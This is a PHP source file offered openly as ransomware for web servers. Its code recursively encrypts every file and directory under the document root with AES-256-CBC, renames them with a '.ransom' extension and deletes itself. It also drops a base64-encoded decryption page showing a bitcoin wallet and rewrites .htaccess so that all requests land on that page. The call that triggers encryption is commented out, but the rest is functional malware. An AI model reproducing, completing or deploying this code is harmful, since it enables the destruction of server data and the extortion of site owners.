<?php
error_reporting(0);
class Ransomware {
    private $root = '';
    private $salt = '';
    private $cryptoKey = '';
    private $cryptoKeyLength = '32';
    private $iterations = '10000';
    private $algorithm = 'SHA512';
    private $iv = '';
    private $cipher = 'AES-256-CBC';
    private $extension = 'ransom';
    public function __construct($key) {
        $this->root = $_SERVER['DOCUMENT_ROOT'];
        $this->salt = openssl_random_pseudo_bytes(10);
        $this->cryptoKey = openssl_pbkdf2($key, $this->salt, $this->cryptoKeyLength, $this->iterations, $this->algorithm);
        $this->iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($this->cipher));
    }
    private function generateRandomName($directory, $extension) {
        $randomName = '';
        do {
            $randomName = str_replace(array('+', '/', '='), '', base64_encode(openssl_random_pseudo_bytes(6)));
            $randomName = $directory . '/' . $randomName . '.' . $extension;
        } while (file_exists($randomName));
        return $randomName;
    }
    private function createDecryptionFile() {
        // decryption file encoded in Base64
        $data = base64_decode('PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmNsYXNzIFJhbnNvbXdhcmUgew0KICAgIHByaXZhdGUgJHJvb3QgPSAnPHJvb3Q+JzsNCiAgICBwcml2YXRlICRzYWx0ID0gJyc7DQogICAgcHJpdmF0ZSAkY3J5cHRvS2V5ID0gJyc7DQogICAgcHJpdmF0ZSAkY3J5cHRvS2V5TGVuZ3RoID0gJzxjcnlwdG9LZXlMZW5ndGg+JzsNCiAgICBwcml2YXRlICRpdGVyYXRpb25zID0gJzxpdGVyYXRpb25zPic7DQogICAgcHJpdmF0ZSAkYWxnb3JpdGhtID0gJzxhbGdvcml0aG0+JzsNCiAgICBwcml2YXRlICRpdiA9ICcnOw0KICAgIHByaXZhdGUgJGNpcGhlciA9ICc8Y2lwaGVyPic7DQogICAgcHJpdmF0ZSAkZXh0ZW5zaW9uID0gJzxleHRlbnNpb24+JzsNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGtleSkgew0KICAgICAgICAkdGhpcy0+c2FsdCA9IGJhc2U2NF9kZWNvZGUoJzxzYWx0PicpOw0KICAgICAgICAkdGhpcy0+Y3J5cHRvS2V5ID0gb3BlbnNzbF9wYmtkZjIoJGtleSwgJHRoaXMtPnNhbHQsICR0aGlzLT5jcnlwdG9LZXlMZW5ndGgsICR0aGlzLT5pdGVyYXRpb25zLCAkdGhpcy0+YWxnb3JpdGhtKTsNCiAgICAgICAgJHRoaXMtPml2ID0gYmFzZTY0X2RlY29kZSgnPGl2PicpOw0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGRlbGV0ZURlY3J5cHRpb25GaWxlKCkgew0KICAgICAgICB1bmxpbmsoJHRoaXMtPnJvb3QgLiAnLy5odGFjY2VzcycpOw0KICAgICAgICB1bmxpbmsoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKTsNCiAgICB9DQogICAgcHJpdmF0ZSBmdW5jdGlvbiBkZWNyeXB0TmFtZSgkcGF0aCkgew0KICAgICAgICAkZGVjcnlwdGVkTmFtZSA9IG9wZW5zc2xfZGVjcnlwdCh1cmxkZWNvZGUocGF0aGluZm8oJHBhdGgsIFBBVEhJTkZPX0ZJTEVOQU1FKSksICR0aGlzLT5jaXBoZXIsICR0aGlzLT5jcnlwdG9LZXksIDAsICR0aGlzLT5pdik7DQogICAgICAgICRkZWNyeXB0ZWROYW1lID0gJGRlY3J5cHRlZE5hbWUgIT09IGZhbHNlID8gc3Vic3RyKCRwYXRoLCAwLCBzdHJyaXBvcygkcGF0aCwgJy8nKSArIDEpIC4gJGRlY3J5cHRlZE5hbWUgOiAkZGVjcnlwdGVkTmFtZTsNCiAgICAgICAgcmV0dXJuICRkZWNyeXB0ZWROYW1lOw0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGRlY3J5cHREaXJlY3RvcnkoJGVuY3J5cHRlZERpcmVjdG9yeSkgew0KICAgICAgICBpZiAocGF0aGluZm8oJGVuY3J5cHRlZERpcmVjdG9yeSwgUEFUSElORk9fRVhURU5TSU9OKSA9PT0gJHRoaXMtPmV4dGVuc2lvbikgew0KICAgICAgICAgICAgJGRpcmVjdG9yeSA9ICR0aGlzLT5kZWNyeXB0TmFtZSgkZW5jcnlwdGVkRGlyZWN0b3J5KTsNCiAgICAgICAgICAgIGlmICgkZGlyZWN0b3J5ICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgIHJlbmFtZSgkZW5jcnlwdGVkRGlyZWN0b3J5LCAkZGlyZWN0b3J5KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGRlY3J5cHRGaWxlKCRlbmNyeXB0ZWRGaWxlKSB7DQogICAgICAgIGlmIChwYXRoaW5mbygkZW5jcnlwdGVkRmlsZSwgUEFUSElORk9fRVhURU5TSU9OKSA9PT0gJHRoaXMtPmV4dGVuc2lvbikgew0KICAgICAgICAgICAgJGRhdGEgPSBvcGVuc3NsX2RlY3J5cHQoZmlsZV9nZXRfY29udGVudHMoJGVuY3J5cHRlZEZpbGUpLCAkdGhpcy0+Y2lwaGVyLCAkdGhpcy0+Y3J5cHRvS2V5LCAwLCAkdGhpcy0+aXYpOw0KICAgICAgICAgICAgaWYgKCRkYXRhICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgICRmaWxlID0gJHRoaXMtPmRlY3J5cHROYW1lKCRlbmNyeXB0ZWRGaWxlKTsNCiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT09IGZhbHNlICYmIHJlbmFtZSgkZW5jcnlwdGVkRmlsZSwgJGZpbGUpKSB7DQogICAgICAgICAgICAgICAgICAgIGlmICghZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRkYXRhLCBMT0NLX0VYKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmVuYW1lKCRmaWxlLCAkZW5jcnlwdGVkRmlsZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgcHJpdmF0ZSBmdW5jdGlvbiBzY2FuKCRkaXJlY3RvcnkpIHsNCiAgICAgICAgJGZpbGVzID0gYXJyYXlfZGlmZihzY2FuZGlyKCRkaXJlY3RvcnkpLCBhcnJheSgnLicsICcuLicpKTsNCiAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7DQogICAgICAgICAgICBpZiAoaXNfZGlyKCRkaXJlY3RvcnkgLiAnLycgLiAkZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c2NhbigkZGlyZWN0b3J5IC4gJy8nIC4gJGZpbGUpOw0KICAgICAgICAgICAgICAgICR0aGlzLT5kZWNyeXB0RGlyZWN0b3J5KCRkaXJlY3RvcnkgLiAnLycgLiAkZmlsZSk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICR0aGlzLT5kZWNyeXB0RmlsZSgkZGlyZWN0b3J5IC4gJy8nIC4gJGZpbGUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBydW4oKSB7DQogICAgICAgICR0aGlzLT5kZWxldGVEZWNyeXB0aW9uRmlsZSgpOw0KICAgICAgICBpZiAoJHRoaXMtPmNyeXB0b0tleSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICR0aGlzLT5zY2FuKCR0aGlzLT5yb290KTsNCiAgICAgICAgfQ0KICAgIH0NCn0NCiRlcnJvck1lc3NhZ2VzID0gYXJyYXkoDQogICAgJ2tleScgPT4gJycNCik7DQppZiAoaXNzZXQoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10pICYmIHN0cnRvbG93ZXIoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10pID09PSAncG9zdCcpIHsNCiAgICBpZiAoaXNzZXQoJF9QT1NUWydrZXknXSkpIHsNCiAgICAgICAgJHBhcmFtZXRlcnMgPSBhcnJheSgNCiAgICAgICAgICAgICdrZXknID0+ICRfUE9TVFsna2V5J10NCiAgICAgICAgKTsNCiAgICAgICAgbWJfaW50ZXJuYWxfZW5jb2RpbmcoJ1VURi04Jyk7DQogICAgICAgICRlcnJvciA9IGZhbHNlOw0KICAgICAgICBpZiAobWJfc3RybGVuKCRwYXJhbWV0ZXJzWydrZXknXSkgPCAxKSB7DQogICAgICAgICAgICAkZXJyb3JNZXNzYWdlc1sna2V5J10gPSAnUGxlYXNlIGVudGVyIGRlY3J5cHRpb24ga2V5JzsNCiAgICAgICAgICAgICRlcnJvciA9IHRydWU7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCEkZXJyb3IpIHsNCiAgICAgICAgICAgICRyYW5zb213YXJlID0gbmV3IFJhbnNvbXdhcmUoJHBhcmFtZXRlcnNbJ2tleSddKTsNCiAgICAgICAgICAgICRyYW5zb213YXJlLT5ydW4oKTsNCiAgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IC8nKTsNCiAgICAgICAgICAgIGV4aXQoKTsNCiAgICAgICAgfQ0KICAgIH0NCn0NCiRpbWcgPSAnaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUpZQUFBQ1dDQUlBQUFDelkrYTFBQUFBQm1KTFIwUUEvd0QvQVArZ3ZhZVRBQUFEWWtsRVFWUjRuTzJkeTI3ak1Bd0FuVVgvLzVmVHd4WTVDSTRnaGFUa2NXWXVDMno4YWdkRVdJbWtIOC9uOHhBeS8zWS9nRVQ1K2YvUDQvRlljNytwb0crZXFqbDMyYWQ5SXVkR2VOM1hLTVNqUWp3cXhLTkNQRCtuLzV2NGwwYi82NzJmVnZTcHk0d2lOMG84dCtIZFF4cUZlRlNJUjRWNFZJam5QSjFwaUt4V1JBN3VmOXJQVUNLUDBWdzVNZG1wK0UwYWhYaFVpRWVGZUZTSVp5aWRxU1B4NjMwcTZZaGtLTXUya3dZeEN2R29FSThLOGFnUXorWjBacXFrcFg5dUE2TCtKUVdqRUk4SzhhZ1Fqd3J4REtVemRVWDdVNG5EMUpKS1lvYVMrT05YL0NhTlFqd3F4S05DUENyRWM1N083RnFlU093L1N1eGRtcnB5LytBS2pFSThLc1NqUWp3cXhQTzQxTGlFdWxLYXlLN1d4VEVLOGFnUWp3cnhxQkJQL3R5WnVsMmV4T1dZWFdOb0VqOTlZUlRpVVNFZUZlSlJJWjZoMVpsbG5jcTdCdVZGK3A3cUp0b01ubXNVNGxFaEhoWGlVU0dlVDBxQnAxWko2bGhXU2pQVllKVllXZVBjbVc5QmhYaFVpRWVGZUlZMm14SW40eTJyanBtNmIrSVl2Y1FSd200MmZRc3F4S05DUENyRTg1Zk8xRFgrSko2YnVLdTFhODhyY3FOM0dJVjRWSWhIaFhoVWlPZXZkbVpCaWNmSXdWUDMzZlVZZFMzZ245M1hLTVNqUWp3cXhLTkNQT2ZwekxJdjhHWEQ3cTdadDIzdGpCeUhDbStBQ3ZHb0VFLzVHTDI2dXB2SW1sSGREbEhpd1lNWWhYaFVpRWVGZUZTSVo2aDJKckphVWJjSDFMOVJaS09xTHF1cXFKTTJDdkdvRUk4SzhhZ1F6M2xuRTJJUGFOZnN1d2dWVnpZSzhhZ1Fqd3J4cUJCUFF1MU1lOFdDL1pRNGRUOWc0dEtWbTAxZmlncnhxQkNQQ3ZFTWpkRnJtUG9TdnNnNDNzUlA2M0s5cVlQZGJMb1BLc1NqUWp3cXhKTS9GYmhoV2RQUXNyMm5xY2RJdkpGajlHNkxDdkdvRUk4SzhXeCtvM1pkLzNUaS90R3k0WDVUdURwekgxU0lSNFY0Vklnbi80M2FmUks3cXhPdnZLdkJ5cW5BY2h3cXZBRXF4S05DUE9lYlRYVzlQUDBiSmM0TTNqWHJyKzZkVGU4T05ncnhxQkNQQ3ZHb0VNOVE3Y3l5TnhNazF0RTIxRFVyN1hxLzFRdWpFSThLOGFnUWp3cnhmTkxaVkVla3BhZ2hjVWxsMlZ2QVA4dHVqRUk4S3NTalFqd3F4SE90ZEtZaGt0MHMyeEpxcUt0Q3NyUHB0cWdRandyeHFCRFBKNDNheTZpcjdvMFU3UFpaM3lCdUZPSlJJUjRWNGxFaG52SlhVQzVqMTdDWS9xVVdMQ0VaaFhoVWlFZUZlRlNJWi9QY0dZbGpGT0pSSVo1ZmVndFRVQVhwVmhVQUFBQUFTVVZPUks1Q1lJST0nOw0KPz4NCjwhRE9DVFlQRSBodG1sPg0KPGh0bWwgbGFuZz0iZW4iPg0KCTxoZWFkPg0KCQk8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQoJCTx0aXRsZT5SYW5zb213YXJlPC90aXRsZT4NCgkJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlJhbnNvbXdhcmUgd3JpdHRlbiBpbiBQSFAuIj4NCgkJPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IkhUTUwsIENTUywgUEhQLCByYW5zb213YXJlIj4NCgkJPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJJdmFuIMWgaW5jZWsiPg0KCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQoJCTxzdHlsZT4NCgkJCWh0bWwgew0KCQkJCWhlaWdodDogMTAwJTsNCgkJCX0NCgkJCWJvZHkgew0KCQkJCWJhY2tncm91bmQtY29sb3I6ICMyNjI2MjY7DQoJCQkJZGlzcGxheTogZmxleDsNCgkJCQlmbGV4LWRpcmVjdGlvbjogY29sdW1uOw0KCQkJCW1hcmdpbjogMDsNCgkJCQloZWlnaHQ6IGluaGVyaXQ7DQoJCQkJY29sb3I6ICNGOEY4Rjg7DQoJCQkJZm9udC1mYW1pbHk6IEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7DQoJCQkJZm9udC1zaXplOiAxZW07DQoJCQkJZm9udC13ZWlnaHQ6IDQwMDsNCgkJCQl0ZXh0LWFsaWduOiBsZWZ0Ow0KCQkJfQ0KCQkJLmZyb250LWZvcm0gew0KCQkJCWRpc3BsYXk6IGZsZXg7DQoJCQkJZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCgkJCQlhbGlnbi1pdGVtczogY2VudGVyOw0KCQkJCWp1c3RpZnktY29udGVudDogY2VudGVyOw0KCQkJCWZsZXg6IDEgMCBhdXRvOw0KCQkJCXBhZGRpbmc6IDAuNWVtOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCB7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogI0RDRENEQzsNCgkJCQlwYWRkaW5nOiAxLjVlbTsNCgkJCQl3aWR0aDogMjFlbTsNCgkJCQljb2xvcjogIzAwMDsNCgkJCQlib3JkZXI6IDAuMDdlbSBzb2xpZCAjMDAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBoZWFkZXIgew0KCQkJCXRleHQtYWxpZ246IGNlbnRlcjsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgaGVhZGVyIC50aXRsZSB7DQoJCQkJbWFyZ2luOiAwOw0KCQkJCWZvbnQtc2l6ZTogMi42ZW07DQoJCQkJZm9udC13ZWlnaHQ6IDQwMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgLmFib3V0IHsNCgkJCQl0ZXh0LWFsaWduOiBjZW50ZXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IC5hYm91dCBwIHsNCgkJCQltYXJnaW46IDFlbSAwOw0KCQkJCWNvbG9yOiAjMkY0RjRGOw0KCQkJCWZvbnQtd2VpZ2h0OiA2MDA7DQoJCQkJd29yZC13cmFwOiBicmVhay13b3JkOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCAuYWJvdXQgaW1nIHsNCgkJCQlib3JkZXI6IDAuMDdlbSBzb2xpZCAjMDAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIHsNCgkJCQlkaXNwbGF5OiBmbGV4Ow0KCQkJCWZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQoJCQkJbWFyZ2luLXRvcDogMWVtOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIGlucHV0IHsNCgkJCQktd2Via2l0LWFwcGVhcmFuY2U6IG5vbmU7DQoJCQkJLW1vei1hcHBlYXJhbmNlOiBub25lOw0KCQkJCWFwcGVhcmFuY2U6IG5vbmU7DQoJCQkJbWFyZ2luOiAwOw0KCQkJCXBhZGRpbmc6IDAuMmVtIDAuNGVtOw0KCQkJCWZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOw0KCQkJCWZvbnQtc2l6ZTogMWVtOw0KCQkJCWJvcmRlcjogMC4wN2VtIHNvbGlkICM5RDJBMDA7DQoJCQkJLXdlYmtpdC1ib3JkZXItcmFkaXVzOiAwOw0KCQkJCS1tb3otYm9yZGVyLXJhZGl1czogMDsNCgkJCQlib3JkZXItcmFkaXVzOiAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIGlucHV0W3R5cGU9InN1Ym1pdCJdIHsNCgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjRkY0NTAwOw0KCQkJCWNvbG9yOiAjRjhGOEY4Ow0KCQkJCWN1cnNvcjogcG9pbnRlcjsNCgkJCQl0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDIyMG1zIGxpbmVhcjsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSBpbnB1dFt0eXBlPSJzdWJtaXQiXTpob3ZlciB7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogI0Q4M0EwMDsNCgkJCQl0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDIyMG1zIGxpbmVhcjsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSAuZXJyb3Igew0KCQkJCW1hcmdpbjogMCAwIDFlbSAwOw0KCQkJCWNvbG9yOiAjOUQyQTAwOw0KCQkJCWZvbnQtc2l6ZTogMC44ZW07DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gLmVycm9yOm5vdCg6ZW1wdHkpIHsNCgkJCQltYXJnaW46IDAuMmVtIDAgMWVtIDA7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gbGFiZWwgew0KCQkJCW1hcmdpbi1ib3R0b206IDAuMmVtOw0KCQkJCWhlaWdodDogMS4yZW07DQoJCQl9DQoJCQlAbWVkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOiA0ODBweCkgew0KCQkJCS5mcm9udC1mb3JtIC5sYXlvdXQgew0KCQkJCQl3aWR0aDogMTUuNWVtOw0KCQkJCX0NCgkJCX0NCgkJCUBtZWRpYSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6IDMyMHB4KSB7DQoJCQkJLmZyb250LWZvcm0gLmxheW91dCB7DQoJCQkJCXdpZHRoOiAxNC41ZW07DQoJCQkJfQ0KCQkJCS5mcm9udC1mb3JtIC5sYXlvdXQgaGVhZGVyIC50aXRsZSB7DQoJCQkJCWZvbnQtc2l6ZTogMi40ZW07DQoJCQkJfQ0KCQkJCS5mcm9udC1mb3JtIC5sYXlvdXQgLmFib3V0IHAgew0KCQkJCQlmb250LXNpemU6IDAuOWVtOw0KCQkJCX0NCgkJCX0NCgkJPC9zdHlsZT4NCgk8L2hlYWQ+DQoJPGJvZHk+DQoJCTxkaXYgY2xhc3M9ImZyb250LWZvcm0iPg0KCQkJPGRpdiBjbGFzcz0ibGF5b3V0Ij4NCgkJCQk8aGVhZGVyPg0KCQkJCQk8aDEgY2xhc3M9InRpdGxlIj5SYW5zb213YXJlPC9oMT4NCgkJCQk8L2hlYWRlcj4NCgkJCQk8ZGl2IGNsYXNzPSJhYm91dCI+DQoJCQkJCTxwPk1hZGUgYnkgSXZhbiDFoGluY2VrLjwvcD4NCgkJCQkJPHA+SSBob3BlIHlvdSBsaWtlIGl0ITwvcD4NCgkJCQkJPHA+RmVlbCBmcmVlIHRvIGRvbmF0ZSBiaXRjb2luLjwvcD4NCgkJCQkJPGltZyBzcmM9ImRhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCw8P3BocCBlY2hvICRpbWc7ID8+IiBhbHQ9IkJpdGNvaW4gV2FsbGV0Ij4NCgkJCQkJPHA+MUJyWk02VDdHOVJOOHZiYWJuZlh1NE02THBnenRxNlkxNDwvcD4NCgkJCQk8L2Rpdj4NCgkJCQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iPD9waHAgZWNobyAnLi8nIC4gcGF0aGluZm8oJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddLCBQQVRISU5GT19CQVNFTkFNRSk7ID8+Ij4NCgkJCQkJPGxhYmVsIGZvcj0ia2V5Ij5EZWNyeXB0aW9uIEtleTwvbGFiZWw+DQoJCQkJCTxpbnB1dCBuYW1lPSJrZXkiIGlkPSJrZXkiIHR5cGU9InRleHQiIHNwZWxsY2hlY2s9ImZhbHNlIiBhdXRvZm9jdXM9ImF1dG9mb2N1cyI+DQoJCQkJCTxwIGNsYXNzPSJlcnJvciI+PD9waHAgZWNobyAkZXJyb3JNZXNzYWdlc1sna2V5J107ID8+PC9wPg0KCQkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRGVjcnlwdCI+DQoJCQkJPC9mb3JtPg0KCQkJPC9kaXY+DQoJCTwvZGl2Pg0KCTwvYm9keT4NCjwvaHRtbD4NCg==');
        $data = str_replace(
            array(
                '<root>',
                '<salt>',
                '<cryptoKeyLength>',
                '<iterations>',
                '<algorithm>',
                '<iv>',
                '<cipher>',
                '<extension>'
            ),
            array(
                $this->root,
                base64_encode($this->salt),
                $this->cryptoKeyLength,
                $this->iterations,
                $this->algorithm,
                base64_encode($this->iv),
                $this->cipher,
                $this->extension
            ),
            $data
        );
        $decryptionFile = $this->generateRandomName($this->root, 'php');
        file_put_contents($decryptionFile, $data, LOCK_EX);
        $decryptionFile = pathinfo($decryptionFile, PATHINFO_BASENAME);
        file_put_contents($this->root . '/.htaccess', "DirectoryIndex /{$decryptionFile}\nErrorDocument 400 /{$decryptionFile}\nErrorDocument 401 /{$decryptionFile}\nErrorDocument 403 /{$decryptionFile}\nErrorDocument 404 /{$decryptionFile}\nErrorDocument 500 /{$decryptionFile}\n", LOCK_EX);
    }
    private function encryptName($path) {
        $encryptedName = '';
        do {
            $encryptedName = openssl_encrypt(pathinfo($path, PATHINFO_BASENAME), $this->cipher, $this->cryptoKey, 0, $this->iv);
            $encryptedName = $encryptedName !== false ? substr($path, 0, strripos($path, '/') + 1) . urlencode($encryptedName) . '.' . $this->extension : $encryptedName;
        } while ($encryptedName !== false && file_exists($encryptedName));
        return $encryptedName;
    }
    private function encryptDirectory($directory) {
        $encryptedDirectory = $this->encryptName($directory);
        if ($encryptedDirectory !== false) {
            rename($directory, $encryptedDirectory);
        }
    }
    private function encryptFile($file) {
        $encryptedData = openssl_encrypt(file_get_contents($file), $this->cipher, $this->cryptoKey, 0, $this->iv);
        if ($encryptedData !== false) {
            $encryptedFile = $this->encryptName($file);
            if ($encryptedFile !== false && rename($file, $encryptedFile)) {
                if (!file_put_contents($encryptedFile, $encryptedData, LOCK_EX)) {
                    rename($encryptedFile, $file);
                }
            }
        }
    }
    private function scan($directory) {
        $files = array_diff(scandir($directory), array('.', '..'));
        foreach ($files as $file) {
            if (is_dir($directory . '/' . $file)) {
                $this->scan($directory . '/' . $file);
                $this->encryptDirectory($directory . '/' . $file);
            } else {
                $this->encryptFile($directory . '/' . $file);
            }
        }
    }
    public function run() {
        unlink($_SERVER['SCRIPT_FILENAME']);
        if ($this->cryptoKey !== false) {
            $this->scan($this->root);
            $this->createDecryptionFile();
        }
    }
}
$errorMessages = array(
    'key' => ''
);
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
    if (isset($_POST['key'])) {
        $parameters = array(
            'key' => $_POST['key']
        );
        mb_internal_encoding('UTF-8');
        $error = false;
        if (mb_strlen($parameters['key']) < 1) {
            $errorMessages['key'] = 'Please enter encryption key';
            $error = true;
        }
        if (!$error) {
            $ransomware = new Ransomware($parameters['key']);
            // $ransomware->run();
            header('Location: /');
            exit();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Ransomware</title>
		<meta name="description" content="Ransomware written in PHP.">
		<meta name="keywords" content="HTML, CSS, PHP, ransomware">
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<style>
			html {
				height: 100%;
			}
			body {
				background-color: #262626;
				display: flex;
				flex-direction: column;
				margin: 0;
				height: inherit;
				color: #F8F8F8;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				font-weight: 400;
				text-align: left;
			}
			.front-form {
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				flex: 1 0 auto;
				padding: 0.5em;
			}
			.front-form .layout {
				background-color: #DCDCDC;
				padding: 1.5em;
				width: 21em;
				color: #000;
				border: 0.07em solid #000;
			}
			.front-form .layout header {
				text-align: center;
			}
			.front-form .layout header .title {
				margin: 0;
				font-size: 2.6em;
				font-weight: 400;
			}
			.front-form .layout header p {
				margin: 0;
				font-size: 1.2em;
			}
			.front-form .layout .advice p {
				margin: 1em 0 0 0;
			}
			.front-form .layout form {
				display: flex;
				flex-direction: column;
				margin-top: 1em;
			}
			.front-form .layout form input {
				-webkit-appearance: none;
				-moz-appearance: none;
				appearance: none;
				margin: 0;
				padding: 0.2em 0.4em;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				border: 0.07em solid #9D2A00;
				-webkit-border-radius: 0;
				-moz-border-radius: 0;
				border-radius: 0;
			}
			.front-form .layout form input[type="submit"] {
				background-color: #FF4500;
				color: #F8F8F8;
				cursor: pointer;
				transition: background-color 220ms linear;
			}
			.front-form .layout form input[type="submit"]:hover {
				background-color: #D83A00;
				transition: background-color 220ms linear;
			}
			.front-form .layout form .error {
				margin: 0 0 1em 0;
				color: #9D2A00;
				font-size: 0.8em;
			}
			.front-form .layout form .error:not(:empty) {
				margin: 0.2em 0 1em 0;
			}
			.front-form .layout form label {
				margin-bottom: 0.2em;
				height: 1.2em;
			}
			@media screen and (max-width: 480px) {
				.front-form .layout {
					width: 15.5em;
				}
			}
			@media screen and (max-width: 320px) {
				.front-form .layout {
					width: 14.5em;
				}
				.front-form .layout header .title {
					font-size: 2.4em;
				}
				.front-form .layout header p {
					font-size: 1.1em;
				}
				.front-form .layout .advice p {
					font-size: 0.9em;
				}
			}
		</style>
	</head>
	<body>
		<div class="front-form">
			<div class="layout">
				<header>
					<h1 class="title">Ransomware</h1>
					<p>Made by Ivan Šincek</p>
				</header>
				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
					<label for="key">Encryption Key</label>
					<input name="key" id="key" type="text" spellcheck="false" autofocus="autofocus">
					<p class="error"><?php echo $errorMessages['key']; ?></p>
					<input type="submit" value="Encrypt">
				</form>
				<div class="advice">
					<p>Backup your server files!</p>
				</div>
			</div>
		</div>
	</body>
</html>
